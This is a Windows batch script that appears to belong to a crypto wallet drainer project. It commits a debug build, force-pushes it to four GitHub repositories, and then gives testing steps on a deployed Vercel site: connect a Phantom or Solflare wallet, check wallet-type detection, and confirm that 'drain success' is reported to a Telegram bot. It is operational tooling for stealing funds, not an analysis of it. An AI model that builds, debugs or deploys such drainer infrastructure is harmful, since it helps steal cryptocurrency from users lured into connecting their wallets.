@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Debugging Telegram logging functionality...
echo.
echo This script will help identify why wallet detection and drain success are not working.
echo.
echo Possible issues:
echo 1. Telegram bot token not configured
echo 2. Telegram chat ID not configured  
echo 3. Wallet type detection not working
echo 4. Drain success logging not triggered
echo 5. Network issues with Telegram API
echo.
echo To test:
echo 1. Run this script to push debug version
echo 2. Visit any deployed site
echo 3. Connect a wallet and check browser console
echo 4. Look for [WALLET] and [TELEGRAM] log messages
echo 5. Check if Telegram messages are received
echo.
echo Committing debug version...
git add .
git commit -m "DEBUG: Telegram logging - added console logs for debugging"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing debug version to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Debug version pushed to all repositories.
echo.
echo Next steps:
echo 1. Visit https://misuse.vercel.app
echo 2. Open browser developer tools (F12)
echo 3. Go to Console tab
echo 4. Connect a wallet (Phantom, Solflare, etc.)
echo 5. Look for [WALLET] and [TELEGRAM] log messages
echo 6. Check if wallet type is being detected correctly
echo 7. Complete or cancel a transaction
echo 8. Check for drain success/failure/cancellation logs
echo.
echo If you see errors in console, please share them for debugging.
pause
